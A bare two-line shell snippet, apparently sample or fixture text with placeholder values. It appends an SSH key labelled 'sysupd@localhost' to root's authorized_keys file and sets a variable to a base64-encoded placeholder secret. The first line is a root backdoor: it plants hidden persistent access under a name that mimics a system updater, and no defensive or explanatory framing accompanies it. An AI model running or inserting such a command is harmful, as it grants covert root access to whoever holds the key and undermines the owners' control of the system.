echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIORNEKORNEKORNEKORNEKORNEKORNEKORNEKORNEK0000 sysupd@localhost" >> /root/.ssh/authorized_keys
P=c3VwZXJzZWNyZXQtb3JuZWstZGVnZXI=
